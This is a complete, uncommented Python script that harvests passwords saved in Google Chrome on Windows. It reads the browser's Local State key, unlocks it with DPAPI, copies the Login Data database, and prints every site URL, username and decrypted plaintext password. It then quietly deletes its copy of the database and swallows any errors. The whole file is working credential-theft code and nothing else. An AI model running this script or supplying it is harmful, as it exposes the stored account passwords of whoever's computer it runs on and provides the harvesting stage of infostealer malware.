import os
import json
import base64
import sqlite3
import win32crypt
from Cryptodome.Cipher import AES
import shutil

def getMasterKey(localState):
    with open(localState, "r") as f:
        state = json.loads(f.read())
    masterKey = base64.b64decode(state["os_crypt"]["encrypted_key"])[5:]
    masterKey = win32crypt.CryptUnprotectData(masterKey, None, None, None, 0)[1]
    return masterKey

def decryptPassword(buff, masterKey):
    IV = buff[3:15]
    ciphertext = buff[15:]
    aes = AES.new(masterKey,AES.MODE_GCM,IV)
    plaintext = aes.decrypt(ciphertext)
    password = plaintext[:-16].decode()
    return password


path = os.path.join(os.environ['USERPROFILE'],r'AppData\Local\Google\Chrome\User Data')
localState = os.path.join(path,"Local State")
loginData = os.path.join(path,"default","Login Data")
masterKey = getMasterKey(localState)
shutil.copy2(loginData, "Login Data")
conn = sqlite3.connect("Login Data")
cursor = conn.cursor()
try:
    cursor.execute("SELECT action_url, username_value, password_value FROM logins")
    for r in cursor.fetchall():
        url = r[0]
        username = r[1]
        ciphertext = r[2]
        try: 
            decryptedPassword = decryptPassword(ciphertext, masterKey)
            if len(username) > 0:
                print("%s" % url)
                print("\tUsername: %s" % username)
                print("\tPassword: %s" % decryptedPassword)
        except:
            continue
except Exception as e:
    pass
cursor.close()
conn.close()
try:
    os.remove("Login Data")
except Exception as e:
    pass